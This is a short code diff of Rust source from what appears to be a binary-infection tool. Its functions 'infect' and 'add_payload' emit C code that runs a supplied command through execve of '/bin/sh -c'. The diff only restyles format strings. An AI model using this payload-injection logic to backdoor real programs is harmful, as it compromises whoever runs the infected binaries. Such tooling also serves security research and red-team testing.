@@ -13,7 +13,7 @@ pub async fn add_payload(compiler: &mut c::Compiler, payload: &Payload<'_>) -> R
 
             compiler
                 .add_lines(&[
-                    &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
+                    &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{buf}\", NULL}};\n"),
                     "execve(\"/bin/sh\", args, environ);\n",
                     "exit(0);\n",
                 ])
@@ -70,9 +70,7 @@ pub async fn infect(
         if let Some(assume_path) = &config.assume_path {
             let mut buf = String::new();
             c::escape(assume_path.as_bytes(), &mut buf)?;
-            compiler
-                .add_line(&format!("char *p=\"{}\";\n", buf))
-                .await?;
+            compiler.add_line(&format!("char *p=\"{buf}\";\n")).await?;
         } else {
             compiler
                 .add_lines(&[
